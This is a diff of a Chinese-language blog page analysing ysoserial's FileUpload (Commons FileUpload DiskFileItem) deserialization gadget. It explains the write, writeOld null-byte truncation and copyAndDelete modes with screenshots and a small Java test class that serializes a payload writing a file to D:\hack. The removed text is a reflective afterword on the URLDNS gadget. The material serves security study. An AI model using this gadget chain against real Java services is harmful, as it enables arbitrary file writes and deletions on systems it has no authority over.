-<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>本篇是创建博客后的第一篇文章，纪念意义浓厚，不仅是纪念了博客的初创，更重要的是本篇代表个人对于研究方面更严格的自我要求。之所以这么说是因为我在第一次写URLDNS gadgets时大致扫了一遍利用链之后就直接开写，最后在put时就触发了dnslog却没发现这个问题以为自己写好了，当时为自己这么轻松的就写出了payload还洋洋自得。过了段时间再看了一遍才发现自己弄错了，并且作者其实在源码地方特别是继承抽象类的部分特意加了很多注释，意思就是要绕过put出发点，顿时感觉羞愧不已。以此类推，那以前究竟有多少因为研究不仔细、不透彻忽略掉的细节呢？之前部门同事聊天，我们得出了同一个结论，那就是:大佬渗透工程师(研究员)和普通渗透工程师(研究员)之间得区别在于，对于细节得钻研。你看不起得ssrf，大佬就能打到内网权限。你看不起得xxe，大佬就能用xxe拿打域。还有多少例子深刻反映了这一现象，希望从这篇文章起，在大家得监督下成为一个严谨、务实得肾透攻城湿。</p>
+<p>首先对this.dfos进行判断是否为空，这边注意下图中this.dfos属性被transient标志，所以其readObject后永为空。</p>
+<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026185045890.png"></p>
+<p>接下来看File outputFile = this.getTempFile() ，进入getTempFile</p>
+<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026185214521.png"></p>
+<p>this.repository在new DiskFileItem(“test”, “application/octet-stream”, false, “test”, 100000, repository)中被我们设置为了new File(repoPath)，repoPath就是exp参数中我们指定的destDir。</p>
+<p>然后和tmpFileName也就是upload_x_x.tmp拼接得到一个this.tempFile并返回。</p>
+<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026185455292.png"></p>
+<p>然后调用上面的代码，this.sizeThreadhold在Reflections.setFieldValue(diskFileItem, “sizeThreshold”, 0)被设置为了0。最后把this.dfos返回并复制给output。</p>
+<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026185719505.png"></p>
+<p>然后调用output.write(this.cachedContent)将内容保存到destdir\upload_x_x.tmp中。最后关闭output流，执行readObject结束。下面是DiskFileItem的API手册。</p>
+<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026190001368.png"></p>
+<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026185929689.png"></p>
+<p>测试类内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package ysoserial.payloads.myTest;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class FileUpload1 &#123;</span><br><span class="line">    public static void main(String args[]) throws Exception &#123;</span><br><span class="line">        ysoserial.payloads.FileUpload1 fileUpload1&#x3D;new ysoserial.payloads.FileUpload1();</span><br><span class="line">        Object payload&#x3D;fileUpload1.getObject(&quot;write;D:\\hack;123456&quot;);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos&#x3D;new ObjectOutputStream(new FileOutputStream(new File(&quot;out.bin&quot;)));</span><br><span class="line">        oos.writeObject(payload);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois&#x3D;new ObjectInputStream(new FileInputStream(new File(&quot;out.bin&quot;)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026190523271.png"></p>
+<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026190643850.png"></p>
+<p><strong>为什么最后把DiskFileItem实体类的sizeThreshold字段反射设置为了0?</strong></p>
+<p>看上面API手册哦我们知道，在输入的字节&gt;sizeThreshold时，会把文件自动保存到目标中。所以如果sizeThreshold为0，那么只要我们写入一段字符串就会自动保存到目标目录中。</p>
+<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026190510805.png"></p>
+<h4 id="WRITEOLD"><a href="#WRITEOLD" class="headerlink" title="WRITEOLD"></a>WRITEOLD</h4><p>接下来分析这个参数- writeOld;destFile;ascii-data</p>
+<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026214745867.png"></p>
+<p>下面的writePre131时writeOld调用的方法，和write方法比，就是在路径后面加了一个00。很显然就是一个java的00截断。其他的都是和之前分析的write方法一样。java的00截断有jdk版本要求，在晚上看有师傅测试jdk1.7中JDK1.7.0_40（7u40）开始加上了对文件名是否存在\00字符的检查，之前是没有的。而jdk1.6是部分版本还是全部版本</p>
+<h4 id="COPYANDDELETE"><a href="#COPYANDDELETE" class="headerlink" title="COPYANDDELETE"></a>COPYANDDELETE</h4><p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026220809430.png"></p>
+<p>可以看到thresh被设置为了0，data.length=1，所以在writeObject的时候下面的判断为假</p>
+<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026220944312.png"></p>
+<p>得到this.cachedContent=null，this.dfosFile为String copyAndDelte。</p>
+<p>接下来看readObject</p>
+<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/image-20201026221055943.png"></p>
+<p>由于this.cachedContent为空所以进入else。将String copyAndDelte值赋给了String copyTo+”/upload_x_x.tmp”。达到了复制的效果。而this.dfosFile.delete会删除String copyAndDelte指定的文件，也就是源文件。但我实验的时候没有被删除，不清楚是权限问题还是其他什么问题。</p>
 
       
 
@@ -323,7 +344,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -337,15 +358,20 @@
   
 <nav id="article-nav">
   
-    <a href="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BFileUpload/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections1/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          ysoserial学习之FileUpload
+          ysoserial学习之CommonsCollections1
         
       </div>
     </a>
   
+  
+    <a href="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ysoserial学习之URLDNS</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
 </nav>
 
